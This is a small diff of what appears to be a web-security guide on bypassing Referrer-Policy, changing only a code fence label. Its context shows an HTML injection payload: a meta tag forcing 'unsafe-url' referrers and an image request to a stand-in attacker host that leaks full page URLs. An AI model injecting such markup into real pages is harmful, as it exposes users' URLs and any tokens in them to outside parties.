@@ -27,7 +27,7 @@ Referrer-Policy: unsafe-url
 
 You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
 
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
